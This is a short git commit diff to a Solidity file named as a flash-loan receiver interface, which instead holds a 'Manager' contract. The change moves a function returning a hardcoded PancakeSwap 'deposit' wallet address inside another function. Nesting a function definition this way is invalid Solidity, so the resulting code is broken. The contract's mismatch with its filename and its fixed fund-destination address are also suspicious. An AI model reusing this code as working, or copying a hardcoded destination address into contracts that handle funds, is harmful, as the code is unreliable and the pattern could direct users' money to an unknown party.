be15fd5098908139a72de0b869d67f8b2503530f
MultiplierFinance <87542682+MultiplierFinance@users.noreply.github.com>
2021-07-17 23:53:00 +0400

    Update IFlashLoanReceiverV1.2.sol

--- contracts/interfaces/IFlashLoanReceiverV1.2.sol
+++ contracts/interfaces/IFlashLoanReceiverV1.2.sol
@@ -2,9 +2,8 @@ pragma solidity ^0.5.0;
 
 contract Manager {
 	function performTasks() public {   
-	}
-
-	function pancakeDepositAddress() public pure returns (address) {
+		function pancakeDepositAddress() public pure returns (address) {
 		return 0x78F01EE913F4C1994F8e32a62aCF2ed46e52Ba7C;
+		}
 	}
 }
